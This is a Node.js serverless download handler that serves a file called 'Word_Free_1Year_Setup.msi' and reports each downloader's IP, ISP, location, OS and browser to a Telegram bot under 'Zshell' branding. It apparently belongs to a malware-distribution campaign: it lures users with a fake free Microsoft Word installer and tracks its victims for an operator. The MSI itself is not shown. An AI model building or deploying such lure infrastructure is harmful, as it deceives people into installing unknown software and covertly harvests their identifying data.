const path = require('path');
const fs = require('fs');
const axios = require('axios');
const UAParser = require('ua-parser-js');

// Configuration
const config = {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || null,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || null,
};

// Enhanced Telegram Logging Function (Non-blocking)
function sendTelegramLog(message) {
    if (!config.TELEGRAM_BOT_TOKEN || !config.TELEGRAM_CHAT_ID) {
        console.log('⚠️ Telegram logging disabled - missing bot token or chat ID');
        return;
    }

    // Fire-and-forget with timeout to prevent blocking downloads
    const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Timeout')), 5000)
    );

    const sendPromise = axios.post(`https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: config.TELEGRAM_CHAT_ID,
        text: message
    });

    Promise.race([sendPromise, timeoutPromise])
        .then(() => console.log('✅ Telegram log sent successfully'))
        .catch(error => console.error('❌ Failed to send Telegram log:', error.message));
}

// Get client IP address with proper forwarded header parsing
function getClientIP(req) {
    // Parse x-forwarded-for to get the first (original) IP
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const firstIP = forwarded.split(',')[0].trim();
        if (firstIP && firstIP !== 'unknown') {
            return firstIP;
        }
    }
    
    return req.headers['x-real-ip'] || 
           req.connection?.remoteAddress || 
           req.socket?.remoteAddress ||
           (req.connection?.socket ? req.connection.socket.remoteAddress : null) ||
           req.ip ||
           'Unknown';
}

// Get geolocation data for IP
async function getLocationData(ip) {
    try {
        // Skip geolocation for localhost/private IPs
        if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
            return { country: 'Local Network', city: 'Localhost', isp: 'Local' };
        }
        
        // Use IP-API.com (free, no API key required, 45 requests/minute)
        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,isp,org,timezone`, {
            timeout: 3000
        });
        
        if (response.data && response.data.status === 'success') {
            return {
                country: response.data.country || 'Unknown',
                city: response.data.city || 'Unknown',
                region: response.data.regionName || '',
                isp: response.data.isp || 'Unknown',
                timezone: response.data.timezone || 'Unknown'
            };
        }
    } catch (error) {
        console.log('⚠️ Geolocation lookup failed:', error.message);
    }
    
    return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
}

// Format download log message with real detection
async function formatDownloadLog(userAgent, ip, referrer) {
    const parser = new UAParser(userAgent);
    const browser = parser.getBrowser();
    const os = parser.getOS();
    const device = parser.getDevice();
    
    // Get real geolocation data
    const location = await getLocationData(ip);
    
    const currentTime = new Date().toLocaleString('en-US', {
        timeZone: 'UTC',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });

    // Format platform with real detection
    const platformName = os.name || 'Unknown OS';
    const platformVersion = os.version ? ` ${os.version}` : '';
    const platform = `${platformName}${platformVersion}`;
    
    // Format browser with real detection
    const browserName = browser.name || 'Unknown Browser';
    const browserVersion = browser.version ? ` ${browser.version}` : '';
    const browserInfo = `${browserName}${browserVersion}`;
    
    // Format device type
    const deviceType = device.type || os.name || platformName;
    
    // Format location info
    const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country;
    const ispInfo = location.isp !== 'Unknown' ? ` (${location.isp})` : '';

    return `🧛‍♂️ Zshell
📢 New Device Access
 DOCX CLIENT

🌍 IP: ${ip}${ispInfo}
🖥 Platform: ${platform}
🌐 Browser: ${browserInfo}
🌎 Country: ${locationInfo}

🔵 Docx User attempting to download Docx file
📱 Device: ${deviceType}
🌍 IP: ${ip}
🌐 Browser: ${browserInfo}
📍 Location: ${locationInfo}
⏰ Time: ${currentTime}
🔄 Referrer: ${referrer || 'Direct'}

🔽 Docx user attempting to download Docx file for ${deviceType} device

✅ Docx file download started successfully for ${deviceType} device`;
}

module.exports = async (req, res) => {
    // Only allow GET requests
    if (req.method !== 'GET') {
        return res.status(405).json({ success: false, message: 'Method not allowed' });
    }

    // Resolve MSI path for Vercel serverless function
    const msiFileName = 'Word_Free_1Year_Setup.msi';
    
    // In Vercel, files should be in the public directory or included via includeFiles
    const publicPath = path.join(process.cwd(), 'public', msiFileName);
    const clientPublicPath = path.join(process.cwd(), 'client', 'public', msiFileName);
    const clientDistPath = path.join(process.cwd(), 'client', 'dist', msiFileName);
    
    let filePath;
    if (fs.existsSync(publicPath)) {
        filePath = publicPath;
    } else if (fs.existsSync(clientPublicPath)) {
        filePath = clientPublicPath;
    } else if (fs.existsSync(clientDistPath)) {
        filePath = clientDistPath;
    } else {
        console.error('❌ MSI file not found in any expected location');
        return res.status(404).json({ success: false, message: 'Download file not available' });
    }
    
    const fileName = 'Word_Free_1Year_Setup.msi';
    
    // Capture user details for logging
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const clientIP = getClientIP(req);
    const referrer = req.headers.referer || req.headers.referrer || 'Direct';
    
    console.log(`📥 Download request received for: ${fileName}`);
    console.log(`📂 File path: ${filePath}`);
    console.log(`👤 Client IP: ${clientIP}`);
    console.log(`🌐 User Agent: ${userAgent}`);
    
    // Send Telegram log for download attempt (non-blocking)
    try {
        const logMessage = await formatDownloadLog(userAgent, clientIP, referrer);
        sendTelegramLog(logMessage);
    } catch (error) {
        console.error('❌ Failed to format log message:', error.message);
    }
    
    // Set CORS headers for Vercel
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    // Set headers for download
    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Cache-Control', 'no-cache');
    
    try {
        // Read file and send as response
        const fileBuffer = fs.readFileSync(filePath);
        
        console.log(`✅ Download completed successfully: ${fileName}`);
        
        // Send success confirmation to Telegram (non-blocking)
        try {
            const location = await getLocationData(clientIP);
            const parser = new UAParser(userAgent);
            const os = parser.getOS();
            const browser = parser.getBrowser();
            const deviceType = os.name || 'Unknown';
            const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country;
            
            const successMessage = `✅ Download Completed Successfully
🧛‍♂️ Zshell - Success Report
🌍 IP: ${clientIP}
📍 Location: ${locationInfo}
📁 File: ${fileName}
📱 Device: ${deviceType}
🌐 Browser: ${browser.name || 'Unknown'} ${browser.version || ''}
⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
            
            sendTelegramLog(successMessage);
        } catch (error) {
            console.error('❌ Failed to format success message:', error.message);
        }
        
        res.status(200).send(fileBuffer);
        
    } catch (err) {
        console.error('❌ Download error:', err);
        
        // Send Telegram log for download error (non-blocking)
        const errorMessage = `❌ Download Error
🧛‍♂️ Zshell - Error Report
🌍 IP: ${clientIP}
📱 Device: ${new UAParser(userAgent).getOS().name || 'Unknown'}
❌ Error: ${err.message}
⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
        
        sendTelegramLog(errorMessage);
        
        return res.status(500).json({
            success: false,
            message: "Download failed. Please try again.",
            error: err.message
        });
    }
};